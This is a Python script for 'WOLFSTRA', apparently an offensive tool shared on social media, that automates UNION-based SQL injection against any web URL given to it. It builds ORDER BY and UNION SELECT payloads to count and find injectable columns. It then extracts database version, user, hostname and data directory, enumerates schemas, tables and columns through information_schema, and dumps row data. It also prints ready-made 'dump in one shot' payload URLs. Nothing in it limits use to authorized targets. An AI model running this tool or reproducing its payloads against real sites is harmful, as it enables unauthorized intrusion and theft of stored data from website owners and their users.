#!/usr/bin/env python3
"""
=============================================================
  ██╗    ██╗ ██████╗ ██╗     ███████╗███████╗████████╗██████╗  █████╗ 
  ██║    ██║██╔═══██╗██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
  ██║ █╗ ██║██║   ██║██║     █████╗  ███████╗   ██║   ██████╔╝███████║
  ██║███╗██║██║   ██║██║     ██╔══╝  ╚════██║   ██║   ██╔══██╗██╔══██║
  ╚███╔███╔╝╚██████╔╝███████╗██║     ███████║   ██║   ██║  ██║██║  ██║
   ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
=============================================================
  WOLFSTRA - UNION Based SQLi Exploitation Framework
  Created by : Wolf Intelligence
  GitHub     : https://github.com/halakuwolfintelegence/
  Instagram  : @wolf.intelligence
  Version    : 2.0 - DIOS Edition
=============================================================
"""

import requests
import sys
import re
import time
from colorama import init, Fore, Back, Style

init(autoreset=True)

# ============================================================
# BOX DRAWING FUNCTIONS
# ============================================================

def box_top(width=60):
    return f"{Fore.CYAN}╔{'═' * width}╗{Style.RESET_ALL}"

def box_bottom(width=60):
    return f"{Fore.CYAN}╚{'═' * width}╝{Style.RESET_ALL}"

def box_mid(width=60):
    return f"{Fore.CYAN}╟{'─' * width}╢{Style.RESET_ALL}"

def box_line(text, align="left", width=60, color=Fore.WHITE):
    """Draw a line inside box with proper padding"""
    if align == "center":
        padding = width - len(text)
        left_pad = padding // 2
        right_pad = padding - left_pad
        return f"{Fore.CYAN}║{color}{' ' * left_pad}{text}{' ' * right_pad}{Fore.CYAN}║{Style.RESET_ALL}"
    else:
        return f"{Fore.CYAN}║ {color}{text}{' ' * (width - len(text) - 1)}{Fore.CYAN}║{Style.RESET_ALL}"

def box_multi(lines, width=60):
    """Render multiple lines inside a box"""
    output = []
    output.append(box_top(width))
    for i, (text, align, color) in enumerate(lines):
        output.append(box_line(text, align, width, color))
    output.append(box_bottom(width))
    return "\n".join(output)

def mini_box(text, color=Fore.GREEN, width=60):
    """Single line mini box"""
    return f"{Fore.CYAN}║ {color}{text}{' ' * (width - len(text) - 1)}{Fore.CYAN}║{Style.RESET_ALL}"

def result_box(label, value, width=60):
    """Display a labeled result in a box row"""
    total = len(label) + len(value) + 3
    if total > width:
        value = value[:width - len(label) - 6] + "..."
        total = width
    spacing = width - total
    return f"{Fore.CYAN}║ {Fore.YELLOW}{label}{Fore.WHITE}: {Fore.GREEN}{value}{' ' * spacing}{Fore.CYAN}║{Style.RESET_ALL}"

# ============================================================
# BANNER
# ============================================================

BANNER = f"""
{Fore.RED}    ╔══════════════════════════════════════════════════════════════╗
    ║{Fore.YELLOW}  ██╗    ██╗ ██████╗ ██╗     ███████╗███████╗████████╗██████╗  █████╗ {Fore.RED}║
    ║{Fore.YELLOW}  ██║    ██║██╔═══██╗██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗{Fore.RED}║
    ║{Fore.GREEN}  ██║ █╗ ██║██║   ██║██║     █████╗  ███████╗   ██║   ██████╔╝███████║{Fore.RED}║
    ║{Fore.GREEN}  ██║███╗██║██║   ██║██║     ██╔══╝  ╚════██║   ██║   ██╔══██╗██╔══██║{Fore.RED}║
    ║{Fore.CYAN}  ╚███╔███╔╝╚██████╔╝███████╗██║     ███████║   ██║   ██║  ██║██║  ██║{Fore.RED}║
    ║{Fore.CYAN}   ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝{Fore.RED}║
    ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

def show_header():
    """Show main header box"""
    lines = [
        ("W O L F S T R A  v2.0  -  DIOS EDITION", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        ("UNION Based SQLi Exploitation Framework", "center", Fore.CYAN),
        ("", "left", Fore.WHITE),
        ("Created by : Wolf Intelligence", "center", Fore.YELLOW),
        ("GitHub     : https://github.com/halakuwolfintelegence/", "center", Fore.GREEN),
        ("Instagram  : @wolf.intelligence", "center", Fore.MAGENTA),
    ]
    print(BANNER)
    print(box_multi(lines))

def show_help():
    """Show help menu in box"""
    lines = [
        ("USAGE", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        ("python wolfstra.py <URL> [OPTIONS]", "left", Fore.YELLOW),
        ("", "left", Fore.WHITE),
        ("EXAMPLES:", "left", Fore.CYAN),
        ("  Auto Mode    : python wolfstra.py \"http://site.com/page?id=1\"", "left", Fore.WHITE),
        ("  Find Columns : python wolfstra.py URL --find-cols", "left", Fore.WHITE),
        ("  DB Info      : python wolfstra.py URL --db-info 7", "left", Fore.WHITE),
        ("  Dump Tables  : python wolfstra.py URL --tables 7 db_name", "left", Fore.WHITE),
        ("  Dump Data    : python wolfstra.py URL --dump 7 db table col1,col2", "left", Fore.WHITE),
    ]
    print(box_multi(lines, 70))

def show_step(step_num, text):
    """Show a numbered step"""
    return f"{Fore.CYAN}║{Fore.RED} [{step_num}/4] {Fore.YELLOW}{text}{' ' * (55 - len(text))}{Fore.CYAN}║{Style.RESET_ALL}"

def show_progress(text):
    """Progress indicator"""
    return f"{Fore.CYAN}║{Fore.BLUE} >>> {Fore.WHITE}{text}{' ' * (54 - len(text))}{Fore.CYAN}║{Style.RESET_ALL}"

# ============================================================
# CORE FUNCTIONS
# ============================================================

def print_info(msg):
    print(f"  {Fore.CYAN}[*] {Style.RESET_ALL}{msg}")

def print_success(msg):
    print(f"  {Fore.GREEN}[+] {Style.RESET_ALL}{msg}")

def print_error(msg):
    print(f"  {Fore.RED}[-] {Style.RESET_ALL}{msg}")

def print_warning(msg):
    print(f"  {Fore.YELLOW}[!] {Style.RESET_ALL}{msg}")

def test_connection(url):
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0 WOLFSTRA/2.0"})
        return True
    except:
        return False

def find_columns_order_by(url, param, method="GET", max_cols=50):
    """Find column count using ORDER BY"""
    lines = [
        ("COLUMN FINDER - PHASE 1", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        ("Technique : ORDER BY", "left", Fore.CYAN),
        ("Max Cols  : " + str(max_cols), "left", Fore.YELLOW),
    ]
    print(box_multi(lines))
    
    for i in range(1, max_cols + 1):
        payload = f"{param}=1' ORDER BY {i}-- -"
        if method.upper() == "GET":
            test_url = url.split("?")[0] + "?" + payload
        
        sys.stdout.write(f"\r  {Fore.BLUE}[>]{Fore.WHITE} Testing column {Fore.YELLOW}{i}{Fore.WHITE}... ")
        sys.stdout.flush()
        
        try:
            r = requests.get(test_url, timeout=10, headers={"User-Agent": "WOLFSTRA/2.0"})
            if "error" in r.text.lower() or "unknown column" in r.text.lower():
                cols = i - 1
                print()
                print()
                lines2 = [
                    ("COLUMN COUNT FOUND!", "center", Fore.GREEN),
                    ("", "left", Fore.WHITE),
                    (f"Total Columns : {cols}", "center", Fore.GREEN),
                ]
                print(box_multi(lines2))
                return cols
        except:
            pass
    print()
    print_warning("ORDER BY failed. Trying NULL technique...")
    return find_columns_null(url, param, method, max_cols)

def find_columns_null(url, param, method="GET", max_cols=50):
    """Find column count using NULL UNION SELECT"""
    lines = [
        ("COLUMN FINDER - PHASE 2", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        ("Technique : UNION SELECT NULL", "left", Fore.CYAN),
    ]
    print(box_multi(lines))
    
    for i in range(1, max_cols + 1):
        nulls = ",".join(["NULL"] * i)
        payload = f"{param}=1' UNION SELECT {nulls}-- -"
        
        if method.upper() == "GET":
            test_url = url.split("?")[0] + "?" + payload
        
        sys.stdout.write(f"\r  {Fore.BLUE}[>]{Fore.WHITE} Testing {Fore.YELLOW}{i}{Fore.WHITE} NULL columns... ")
        sys.stdout.flush()
        
        try:
            r = requests.get(test_url, timeout=10, headers={"User-Agent": "WOLFSTRA/2.0"})
            if "error" not in r.text.lower() and r.status_code == 200:
                print()
                lines2 = [
                    ("COLUMN COUNT FOUND!", "center", Fore.GREEN),
                    ("", "left", Fore.WHITE),
                    (f"Total Columns : {i}", "center", Fore.GREEN),
                ]
                print(box_multi(lines2))
                return i
        except:
            pass
    print()
    print_error("Could not find column count!")
    return None

def find_vulnerable_columns(url, param, cols, method="GET"):
    """Find which columns are injectable"""
    lines = [
        ("VULNERABLE COLUMN DETECTOR", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        (f"Testing {cols} columns for string injection...", "left", Fore.CYAN),
    ]
    print(box_multi(lines))
    
    injectable = []
    for i in range(1, cols + 1):
        positions = []
        for j in range(1, cols + 1):
            if j == i:
                positions.append(f"'<WOLF>{j}</WOLF>'")
            else:
                positions.append("NULL")
        
        union_payload = ",".join(positions)
        payload = f"{param}=-1' UNION SELECT {union_payload}-- -"
        
        if method.upper() == "GET":
            test_url = url.split("?")[0] + "?" + payload
        
        sys.stdout.write(f"\r  {Fore.BLUE}[>]{Fore.WHITE} Testing column {Fore.YELLOW}{i}{Fore.WHITE}... ")
        sys.stdout.flush()
        
        try:
            r = requests.get(test_url, timeout=10, headers={"User-Agent": "WOLFSTRA/2.0"})
            if f"<WOLF>{i}</WOLF>" in r.text:
                injectable.append(i)
        except:
            pass
    
    print()
    if injectable:
        cols_str = ", ".join([f"Col-{c}" for c in injectable])
        lines2 = [
            ("INJECTABLE COLUMNS FOUND", "center", Fore.GREEN),
            ("", "left", Fore.WHITE),
            (f"Columns : {cols_str}", "center", Fore.GREEN),
        ]
        print(box_multi(lines2))
    else:
        print_warning("No injectable columns found via string marker")
    
    return injectable

def get_database_info(url, param, cols, method="GET"):
    """Get database info"""
    lines = [
        ("DATABASE INFORMATION GATHERING", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        ("Extracting DB details...", "left", Fore.CYAN),
    ]
    print(box_multi(lines))
    
    results = {}
    queries = {
        "DB Version": "version()",
        "DB User"   : "user()",
        "DB Name"   : "database()",
        "Hostname"  : "@@hostname",
        "Data Dir"  : "@@datadir",
    }
    
    for label, query in queries.items():
        positions = []
        for j in range(1, cols + 1):
            if j == 1:
                positions.append(query)
            else:
                positions.append("NULL")
        
        union_payload = ",".join(positions)
        payload = f"{param}=-1' UNION SELECT {union_payload}-- -"
        
        if method.upper() == "GET":
            test_url = url.split("?")[0] + "?" + payload
        
        try:
            r = requests.get(test_url, timeout=10, headers={"User-Agent": "WOLFSTRA/2.0"})
            matches = re.findall(r'([\w@.:/\\\-]+)', r.text)
            for match in matches:
                if len(match) > 2 and match not in ['NULL', '-1', '1', '0', '2', '3', '4', '5']:
                    results[label] = match
                    break
        except:
            pass
    
    if results:
        lines2 = [("DATABASE INFO", "center", Fore.GREEN)]
        lines2.append(("", "left", Fore.WHITE))
        for k, v in results.items():
            lines2.append((f"{k:12} : {v}", "left", Fore.YELLOW))
        print(box_multi(lines2))
    
    return results.get("DB Name", "information_schema")

def dump_tables(url, param, cols, db_name, method="GET"):
    """Dump table names"""
    lines = [
        ("TABLE DUMPER", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        (f"Database : {db_name}", "left", Fore.CYAN),
    ]
    print(box_multi(lines))
    
    positions = []
    for j in range(1, cols + 1):
        if j == 1:
            positions.append("group_concat(0x0a,table_name)")
        else:
            positions.append("NULL")
    
    union_payload = ",".join(positions)
    payload = f"{param}=-1' UNION SELECT {union_payload} FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
    
    if method.upper() == "GET":
        test_url = url.split("?")[0] + "?" + payload
    
    try:
        r = requests.get(test_url, timeout=10, headers={"User-Agent": "WOLFSTRA/2.0"})
        # Extract tables from response
        tables = re.findall(r'(\w+)', r.text)
        tables = [t for t in tables if t not in ['NULL', '-1', '1', '0', 'SELECT'] and len(t) > 1]
        
        lines2 = [(f"Tables in {db_name}", "center", Fore.GREEN)]
        lines2.append(("", "left", Fore.WHITE))
        for t in tables[:20]:
            lines2.append((f"  -> {t}", "left", Fore.WHITE))
        if len(tables) > 20:
            lines2.append((f"  ... and {len(tables)-20} more", "left", Fore.YELLOW))
        print(box_multi(lines2))
        return tables[:20]
    except Exception as e:
        print_error(f"Error: {e}")
        return []

def dump_columns(url, param, cols, db_name, table_name, method="GET"):
    """Dump column names"""
    lines = [
        ("COLUMN DUMPER", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        (f"Table : {db_name}.{table_name}", "left", Fore.CYAN),
    ]
    print(box_multi(lines))
    
    positions = []
    for j in range(1, cols + 1):
        if j == 1:
            positions.append("group_concat(0x0a,column_name)")
        else:
            positions.append("NULL")
    
    union_payload = ",".join(positions)
    payload = f"{param}=-1' UNION SELECT {union_payload} FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'-- -"
    
    if method.upper() == "GET":
        test_url = url.split("?")[0] + "?" + payload
    
    try:
        r = requests.get(test_url, timeout=10, headers={"User-Agent": "WOLFSTRA/2.0"})
        columns = re.findall(r'(\w+)', r.text)
        columns = [c for c in columns if c not in ['NULL', '-1', '1', '0', 'SELECT'] and len(c) > 1]
        
        lines2 = [(f"Columns in {table_name}", "center", Fore.GREEN)]
        lines2.append(("", "left", Fore.WHITE))
        for c in columns[:15]:
            lines2.append((f"  -> {c}", "left", Fore.WHITE))
        if len(columns) > 15:
            lines2.append((f"  ... and {len(columns)-15} more", "left", Fore.YELLOW))
        print(box_multi(lines2))
        return columns
    except Exception as e:
        print_error(f"Error: {e}")
        return []

def dump_data(url, param, cols, db_name, table_name, columns, method="GET", limit=10):
    """Dump actual data"""
    col_str = ", ".join(columns.split(","))
    lines = [
        ("DATA DUMPER", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        (f"Table  : {db_name}.{table_name}", "left", Fore.CYAN),
        (f"Cols   : {col_str}", "left", Fore.GREEN),
        (f"Limit  : {limit} rows", "left", Fore.YELLOW),
    ]
    print(box_multi(lines))
    
    positions = []
    col_list = columns.split(",")
    for j in range(1, cols + 1):
        if j <= len(col_list):
            positions.append(f"group_concat(0x0a,{col_list[j-1].strip()})")
        else:
            positions.append("NULL")
    
    union_payload = ",".join(positions)
    payload = f"{param}=-1' UNION SELECT {union_payload} FROM {db_name}.{table_name} LIMIT {limit}-- -"
    
    if method.upper() == "GET":
        test_url = url.split("?")[0] + "?" + payload
    
    try:
        r = requests.get(test_url, timeout=10, headers={"User-Agent": "WOLFSTRA/2.0"})
        data = re.findall(r'(<[^>]+>)([^<]+)', r.text)
        
        lines2 = [(f"DATA DUMP - {table_name}", "center", Fore.GREEN)]
        lines2.append(("", "left", Fore.WHITE))
        
        extracted = []
        for tag, content in data:
            if len(content) > 1 and content not in ['NULL', '-1', 'SELECT']:
                extracted.append(content)
        
        if extracted:
            for e in extracted[:limit]:
                lines2.append((f"  {e}", "left", Fore.WHITE))
        else:
            lines2.append(("  [Raw data in response]", "left", Fore.YELLOW))
        
        print(box_multi(lines2))
        print(f"  {Fore.YELLOW}Raw response (first 500 chars):")
        print(f"  {Fore.WHITE}{r.text[:500]}")
        
    except Exception as e:
        print_error(f"Error: {e}")

def generate_dios(url, param, cols, db_name=None, method="GET"):
    """Generate DIOS (Dump In One Shot) payloads"""
    lines = [
        ("DIOS - DUMP IN ONE SHOT", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        ("Generated Payloads for data extraction:", "left", Fore.CYAN),
    ]
    
    base_url = url.split("?")[0]
    
    # DIOS for databases
    dbs = []
    for j in range(1, cols + 1):
        if j == 1:
            dbs.append("group_concat(schema_name)")
        else:
            dbs.append("NULL")
    
    dios_dbs = f"{Fore.GREEN}{param}=-1' UNION SELECT {','.join(dbs)} FROM information_schema.schemata-- -"
    
    lines.append(("", "left", Fore.WHITE))
    lines.append(("DATABASES:", "left", Fore.YELLOW))
    lines.append((f"{Fore.WHITE}{base_url}?{dios_dbs}", "left", Fore.CYAN))
    
    if db_name:
        # DIOS for tables
        tables = []
        for j in range(1, cols + 1):
            if j == 1:
                tables.append("group_concat(0x0a,table_name)")
            else:
                tables.append("NULL")
        
        dios_tables = f"{Fore.GREEN}{param}=-1' UNION SELECT {','.join(tables)} FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
        lines.append(("", "left", Fore.WHITE))
        lines.append((f"TABLES ({db_name}):", "left", Fore.YELLOW))
        lines.append((f"{Fore.WHITE}{base_url}?{dios_tables}", "left", Fore.CYAN))
    
    print(box_multi(lines, 74))

# ============================================================
# MAIN
# ============================================================

def main():
    show_header()
    
    if len(sys.argv) < 2:
        show_help()
        sys.exit(1)
    
    url = sys.argv[1]
    
    # Extract parameter
    if "?" in url:
        param = url.split("?")[1].split("=")[0]
    else:
        print_error("URL must contain a parameter (e.g., ?id=1)")
        show_help()
        sys.exit(1)
    
    # ---- CONNECTION TEST ----
    print()
    lines = [
        ("CONNECTION TEST", "center", Fore.RED),
        ("", "left", Fore.WHITE),
        ("Target : " + url[:50], "left", Fore.CYAN),
    ]
    print(box_multi(lines))
    
    print(f"  {Fore.BLUE}[>]{Fore.WHITE} Testing connection...", end=" ")
    if not test_connection(url):
        print(f"{Fore.RED}[FAILED]{Style.RESET_ALL}")
        print_error("Target is not reachable!")
        sys.exit(1)
    print(f"{Fore.GREEN}[OK]{Style.RESET_ALL}")
    print_success("Target is reachable!")
    
    # ---- AUTO MODE ----
    if "--auto" in sys.argv or len(sys.argv) == 2:
        lines = [
            ("AUTOMATED EXPLOITATION", "center", Fore.GREEN),
            ("", "left", Fore.WHITE),
            ("Running all modules automatically...", "left", Fore.YELLOW),
        ]
        print(box_multi(lines))
        
        # Step 1: Find columns
        print()
        cols = find_columns_order_by(url, param)
        if not cols:
            cols = find_columns_null(url, param)
        if not cols:
            print_error("Automation failed.")
            sys.exit(1)
        
        # Step 2: Find injectable columns
        print()
        injectable = find_vulnerable_columns(url, param, cols)
        
        # Step 3: DB Info
        print()
        db_name = get_database_info(url, param, cols)
        
        # Step 4: Generate DIOS
        print()
        generate_dios(url, param, cols, db_name if db_name != "information_schema" else None)
        
        # Summary
        print()
        lines = [
            ("EXPLOITATION COMPLETE", "center", Fore.GREEN),
            ("", "left", Fore.WHITE),
            (f"Target    : {url[:45]}", "left", Fore.WHITE),
            (f"Columns   : {cols}", "left", Fore.YELLOW),
            (f"DB Name   : {db_name}", "left", Fore.CYAN),
            ("", "left", Fore.WHITE),
            ("Next Steps:", "left", Fore.GREEN),
            (f"  --tables {cols} {db_name}    (dump tables)", "left", Fore.WHITE),
            (f"  --columns {cols} {db_name} table  (dump columns)", "left", Fore.WHITE),
            (f"  --dump {cols} {db_name} table col1,col2  (dump data)", "left", Fore.WHITE),
        ]
        print(box_multi(lines))
        
        print()
        print(f"  {Fore.MAGENTA}╔══════════════════════════════════════════════════════════════╗")
        print(f"  ║{Fore.RED}  Follow: {Fore.YELLOW}@wolf.intelligence{Fore.MAGENTA} on Instagram for more tools!     ║")
        print(f"  ║{Fore.RED}  GitHub: {Fore.GREEN}https://github.com/halakuwolfintelegence/{Fore.MAGENTA}            ║")
        print(f"  ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    # ---- MANUAL MODES ----
    elif "--find-cols" in sys.argv:
        cols = find_columns_order_by(url, param)
        if not cols:
            cols = find_columns_null(url, param)
    
    elif "--db-info" in sys.argv and len(sys.argv) > 2:
        cols = int(sys.argv[2])
        get_database_info(url, param, cols)
    
    elif "--tables" in sys.argv and len(sys.argv) > 4:
        cols = int(sys.argv[2])
        db = sys.argv[3]
        dump_tables(url, param, cols, db)
        generate_dios(url, param, cols, db)
    
    elif "--columns" in sys.argv and len(sys.argv) > 5:
        cols = int(sys.argv[2])
        db = sys.argv[3]
        table = sys.argv[4]
        dump_columns(url, param, cols, db, table)
    
    elif "--dump" in sys.argv and len(sys.argv) > 6:
        cols = int(sys.argv[2])
        db = sys.argv[3]
        table = sys.argv[4]
        columns = sys.argv[5]
        dump_data(url, param, cols, db, table, columns)
    
    elif "--help" in sys.argv or "-h" in sys.argv:
        show_help()
    
    else:
        show_help()

if __name__ == "__main__":
    main()
